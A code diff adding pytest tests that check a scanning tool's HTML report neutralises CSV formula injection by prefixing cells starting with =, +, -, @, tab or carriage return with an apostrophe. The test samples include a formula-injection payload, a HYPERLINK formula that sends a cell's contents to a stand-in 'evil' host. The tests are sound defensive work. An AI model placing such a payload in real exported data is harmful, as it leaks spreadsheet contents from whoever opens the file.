@@ -268,3 +268,40 @@ def test_graph_edges_use_a_visible_colour(conn, tmp_path):
 
     edge_rule = _re.search(r"\.graph-edge \{([^}]*)\}", page).group(1)
     assert "stroke:var(--muted)" in edge_rule and "var(--border)" not in edge_rule
+
+
+
+# ---------------------------------------------------------------------------
+# CSV export: a cell that starts with = + - @ is executed as a formula by Excel
+# ---------------------------------------------------------------------------
+
+import json as _json
+import shutil as _shutil
+import subprocess as _subprocess
+
+
+def _report_page(conn, tmp_path):
+    scan = _mk_scan(conn, "example.com", is_baseline=True)
+    db.save_many(conn, "assets", [Asset(scan_id=scan.id, host="a.example.com", in_scope=True)])
+    generate_report(conn, "example.com", fmt="html", out_dir=str(tmp_path))
+    return next(tmp_path.glob("*_report.html")).read_text(encoding="utf-8")
+
+
+def test_csv_export_runs_every_cell_through_the_formula_guard(conn, tmp_path):
+    page = _report_page(conn, tmp_path)
+    assert "function csvSafe(v)" in page
+    assert "csvSafe(td.textContent.trim())" in page            # and it is actually used on each exported cell
+
+
+@pytest.mark.skipif(_shutil.which("node") is None, reason="node is not installed")
+def test_csv_guard_neutralises_formula_prefixes(conn, tmp_path):
+    """Executes the report's own JavaScript function, not a copy of it."""
+    page = _report_page(conn, tmp_path)
+    fn = _re.search(r"function csvSafe\(v\) \{.*?\n\}", page, _re.S).group(0)
+    samples = ["=HYPERLINK(\"http://evil/?\"&A1)", "+1+1", "-2+3", "@SUM(A1)", "\t=1", "\r=1",
+               "Plain title", "A1=B2", "10.0.0.1", "SQL injection", ""]
+    out = _subprocess.run(["node", "-e", fn + f"; console.log(JSON.stringify({_json.dumps(samples)}.map(csvSafe)))"],
+                          capture_output=True, text=True, check=True).stdout
+    safe = _json.loads(out)
+    assert safe[:6] == ["'" + x for x in samples[:6]]          # every formula starter gets a leading apostrophe
+    assert safe[6:] == samples[6:]                              # ordinary text is untouched (incl. = inside, digits first)
